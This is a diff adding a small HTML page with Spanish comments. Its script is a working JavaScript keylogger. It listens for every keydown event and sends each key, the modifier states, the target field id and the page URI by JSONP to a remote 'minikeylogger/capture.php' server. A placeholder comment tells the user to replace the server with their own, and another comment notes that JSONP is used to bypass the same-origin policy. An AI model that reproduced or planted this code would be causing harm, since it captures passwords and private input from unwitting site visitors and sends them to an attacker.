@@ -1,0 +1,52 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title></title>
+</head>
+<body>
+	<h1>Hola</h1>
+    <textarea id="comentarios"></textarea>
+
+<script>
+	if((window.jQuery)){
+		console.log('Chi');
+	}else{
+		console.log("Ño");
+		var script = document.createElement('script');
+		script.src = 'https://code.jquery.com/jquery-3.3.1.min.js';
+		document.body.appendChild(script);
+	}
+	function c(d){
+		//$.ajax({
+		jQuery.ajax({
+			dataType: "jsonp", // jsonp para hacer bypass a la política de "mismo origen"
+			type:"GET", // jsonp no funciona con POST :(
+			url: "https://tuhosting-en-algun-server-BTC-de-Europa-del-este/minikeylogger/capture.php", // reemplazar por tu server
+			jsonp:"keypressed",
+			data:{
+				altKey:d.altKey?1:0,
+				ctrlKey:d.ctrlKey?1:0,
+				key:d.key,
+				target:d.target.id,
+				URI:d.target.baseURI
+			},
+			async:false,
+			success: function(data){
+				console.log(data); // para ver que vamos bien
+			},
+			error:function (xhr, ajaxOptions, thrownError){
+				console.log("Error"); // para ver si vamos bien
+			}
+		});	
+	}
+	window.onload = function (){
+		window.addEventListener("keydown",
+			function (e) {
+				c(e);
+			}
+		);
+	}
+</script>
+</body>
+</html>
